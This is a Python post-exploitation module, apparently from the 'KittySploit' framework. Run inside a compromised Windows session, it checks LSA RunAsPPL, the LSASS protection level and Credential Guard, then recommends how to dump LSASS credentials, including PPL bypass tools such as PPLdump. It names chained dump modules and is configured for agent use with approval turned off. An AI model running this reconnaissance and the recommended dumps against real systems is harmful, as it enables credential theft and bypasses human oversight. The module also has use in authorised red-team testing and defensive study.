#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re

from kittysploit import *

from lib.post.windows.session import WindowsSessionMixin


class Module(Post, WindowsSessionMixin):
    __info__ = {
        "name": "Windows Gather RunAsPPL & LSASS Protection Audit",
        "description": (
            "Audit LSA RunAsPPL, LSASS protection level, Credential Guard / VBS, "
            "and recommend an LSASS dump technique (comsvcs, external tool, or PS fallback)."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1003/001/",
        ],
        "agent": {
            "risk": "passive",
            "effects": ["reconnaissance"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": False,
            "produces": ["risk_signals"],
            "cost": 0.5,
            "noise": 0.2,
            "value": 0.9,
            "requires": {"capabilities_any": ["shell"], "capabilities_all": []},
            "chain": {
                "consumes_capabilities": ["shell"],
                "produces_capabilities": [],
                "suggested_followups": [
                    "modules/post/shell/windows/gather/dump_lsass_comsvcs",
                    "modules/post/shell/windows/manage/external_tool_runner",
                    "modules/post/shell/windows/gather/lsass_dump_chain",
                ],
            },
        },
    }

    def _runas_ppl_enabled(self) -> bool:
        out = self.win_execute(
            r'reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL',
            timeout=8,
        )
        if not out:
            return False
        return "0x1" in out.replace(" ", "") or re.search(r"RunAsPPL\s+REG_DWORD\s+0x1", out, re.I)

    def _credential_guard_active(self) -> bool:
        out = self.win_run_powershell(
            "$dg = Get-CimInstance Win32_DeviceGuard -ErrorAction SilentlyContinue; "
            "if ($dg -and $dg.SecurityServicesRunning -contains 1) { 'ON' } else { 'OFF' }",
            timeout=12,
        )
        return "ON" in (out or "")

    def _lsass_protection_level(self) -> str:
        return self.win_run_powershell(
            "try { "
            "(Get-Process lsass -ErrorAction Stop | "
            "Select-Object -ExpandProperty ProtectionLevel) "
            "} catch { $_.Exception.Message }",
            timeout=10,
        )

    def _recommend_dump_method(self, *, runas_ppl: bool, cred_guard: bool) -> str:
        if cred_guard:
            return (
                "Credential Guard active — LSASS secrets are isolated. "
                "Userland dumps (comsvcs, nanodump) will likely miss credentials. "
                "Consider DPAPI / token / Kerberos post modules instead."
            )
        if runas_ppl:
            return (
                "RunAsPPL enabled — prefer external PPL bypass tools "
                "(post/shell/windows/manage/external_tool_runner with PPLdump) "
                "or post/shell/windows/gather/lsass_dump_chain with external_tool set."
            )
        return (
            "No PPL / Credential Guard block detected — "
            "start with post/shell/windows/gather/dump_lsass_comsvcs, "
            "fallback post/shell/windows/gather/dump_lsass if blocked."
        )

    def run(self):
        if not self.win_require_windows():
            return False
        if not self.win_require_powershell():
            return False

        print_info("=" * 60)
        print_info("RunAsPPL (LSA Protection)")
        ppl_raw = self.win_execute(
            r'reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL',
            timeout=8,
        )
        print_info(ppl_raw or "(registry value not found — PPL likely disabled)")
        runas_ppl = self._runas_ppl_enabled()

        print_info("-" * 60)
        print_info("LSASS process protection level")
        level = self._lsass_protection_level()
        print_info(level or "(unable to read ProtectionLevel on this OS/build)")

        print_info("-" * 60)
        print_info("Credential Guard / VBS")
        cred_guard = self._credential_guard_active()
        cg_out = self.win_run_powershell(
            "Get-CimInstance Win32_DeviceGuard -ErrorAction SilentlyContinue | "
            "Format-List | Out-String",
            timeout=12,
        )
        print_info(cg_out or "(Win32_DeviceGuard unavailable)")

        print_info("-" * 60)
        print_info("Dump technique recommendation")
        recommendation = self._recommend_dump_method(
            runas_ppl=runas_ppl,
            cred_guard=cred_guard,
        )
        if cred_guard or runas_ppl:
            print_warning(recommendation)
        else:
            print_success(recommendation)

        if not self.win_is_admin():
            print_status("Session is not elevated — LSASS dump modules will fail without admin.")

        print_info("=" * 60)
        return True
